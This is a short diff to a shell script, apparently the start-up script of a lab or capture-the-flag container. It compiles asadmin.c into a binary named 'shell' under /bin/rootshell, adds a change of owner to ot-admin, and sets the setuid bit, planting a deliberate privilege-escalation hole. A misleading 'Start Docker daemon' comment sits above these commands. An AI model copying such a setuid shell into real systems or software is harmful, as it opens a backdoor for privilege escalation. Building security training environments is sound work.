@@ -6,6 +6,7 @@ set -e
 
 # Start Docker daemon
 cd /bin/rootshell && gcc asadmin.c -o shell
+chown ot-admin /bin/rootshell/shell
 cd /bin/rootshell && chmod u+s shell
 
 # Keep the container running
